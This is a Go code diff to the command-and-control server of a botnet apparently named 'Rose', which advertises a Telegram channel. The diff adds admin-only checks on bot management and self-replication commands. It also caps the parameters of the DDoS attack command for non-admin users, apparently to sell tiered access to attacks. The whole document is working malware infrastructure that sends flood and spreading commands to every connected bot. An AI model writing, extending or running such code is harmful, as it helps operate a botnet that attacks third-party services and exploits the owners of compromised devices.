cnc admin grades.

+++ cnc/lib/socket/master.go
@@ -6,6 +6,7 @@ import (
 	"cnc/lib/utils"
 	"fmt"
 	"net"
+	"strconv"
 	"strings"
 	"time"
 )
@@ -102,12 +103,27 @@ func (m *Master) HandleConnection() {
 				m.Network.Send(utils.FormatSocketString(prompt))
 			}
 		case "!stop":
+			if !m.LoggedUser.Admin {
+				m.Network.Send(utils.FormatSocketString("  » Admin command"))
+				return
+			}
+
 			ttl := m.SendToAllBot("!STOP")
 			m.Network.Send(utils.FormatSocketString(fmt.Sprintf("  » The command has been distributed to %d bots", ttl)))
 		case "update":
+			if !m.LoggedUser.Admin {
+				m.Network.Send(utils.FormatSocketString("  » Admin command"))
+				return
+			}
+
 			ttl := m.SendToAllBot("!UPDATE")
 			m.Network.Send(utils.FormatSocketString(fmt.Sprintf("  » The command has been distributed to %d bots", ttl)))
 		case "device":
+			if !m.LoggedUser.Admin {
+				m.Network.Send(utils.FormatSocketString("  » Admin command"))
+				return
+			}
+
 			for i, bot := range BotList {
 				if !bot.Auth {
 					continue
@@ -116,9 +132,19 @@ func (m *Master) HandleConnection() {
 				m.Network.Send(utils.FormatSocketString(fmt.Sprintf("  » [#%d] [arch: %s] [cpu: %d] [version: %s] [vector: %s]", i, bot.Arch, bot.Cpu, bot.Version, bot.Vector)))
 			}
 		case "killds":
+			if !m.LoggedUser.Admin {
+				m.Network.Send(utils.FormatSocketString("  » Admin command"))
+				return
+			}
+
 			ttl := m.SendToAllBot("!KILLDS") // kill this shit !!
 			m.Network.Send(utils.FormatSocketString(fmt.Sprintf("  » Killed %d bots...", ttl)))
 		case "selfrep":
+			if !m.LoggedUser.Admin {
+				m.Network.Send(utils.FormatSocketString("  » Admin command"))
+				return
+			}
+
 			Exploits := map[string]int{}
 
 			for _, bot := range BotList {
@@ -168,7 +194,46 @@ func (m *Master) HandleConnection() {
 			length = args[6]
 		}
 
-		ttl := m.SendToAllBot(fmt.Sprintf("!DDOS %s %s %s %s %s %s %s", strings.ToUpper(args[0]), args[1], args[2], args[3], thread, power, length))
+		// convert everything to int
+		i_threads, err := strconv.Atoi(thread)
+		if utils.HandleError(err) {
+			return
+		}
+
+		i_power, err := strconv.Atoi(power)
+		if utils.HandleError(err) {
+			return
+		}
+
+		i_length, err := strconv.Atoi(length)
+		if utils.HandleError(err) {
+			return
+		}
+
+		i_time, err := strconv.Atoi(args[3])
+		if utils.HandleError(err) {
+			return
+		}
+
+		if !m.LoggedUser.Admin {
+			if i_threads >= m.LoggedUser.Thread {
+				i_threads = m.LoggedUser.Thread
+			}
+
+			if i_power >= m.LoggedUser.Power {
+				i_power = m.LoggedUser.Power
+			}
+
+			if i_length >= m.LoggedUser.Length {
+				i_length = m.LoggedUser.Length
+			}
+
+			if i_time >= m.LoggedUser.Time {
+				i_time = m.LoggedUser.Time
+			}
+		}
+
+		ttl := m.SendToAllBot(fmt.Sprintf("!DDOS %s %s %s %d %d %d %d", strings.ToUpper(args[0]), args[1], args[2], i_time, i_threads, i_power, i_length))
 		//grafana.MethodCount.WithLabelValues(strings.ToUpper(args[0])).Add(1)
 		m.Network.Send(utils.FormatSocketString(fmt.Sprintf("  » The command has been distributed to %d bots", ttl)))
 	}
@@ -183,7 +248,7 @@ func (m *Master) TaskUpdateTitle() {
 			}
 		}
 
-		m.Network.Send(fmt.Sprintf("\033]0; %s\007", fmt.Sprintf("%d Rose™ » @armv7l", count)))
+		m.Network.Send(fmt.Sprintf("\033]0; %s\007", fmt.Sprintf("%d Rose™ » t.me/rosebotnet", count)))
 		time.Sleep(1 * time.Second)
 	}
 }
